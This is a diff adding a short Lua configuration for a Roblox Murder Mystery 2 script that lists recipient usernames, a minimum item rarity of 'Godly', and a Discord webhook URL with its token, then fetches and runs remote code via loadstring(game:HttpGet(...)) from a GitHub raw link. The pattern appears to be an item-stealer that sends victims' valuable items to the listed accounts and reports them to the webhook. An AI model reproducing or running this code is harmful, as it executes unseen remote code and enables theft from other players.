@@ -1,0 +1,8 @@
+MM2 settings:
+_G.Usernames = {"898584yr", "Foksi4564", "im_huckers666"} -- you can add as many as you'd like
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1371110357460058303/MN68y7ZNxJ9SZ1CM_MW-pkIYYi0BBiefzYVAVpdoUowBtu6Pd57QbojesktHXs5OBxGh" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Fooggii/lelele/refs/heads/main/source.lua"))()
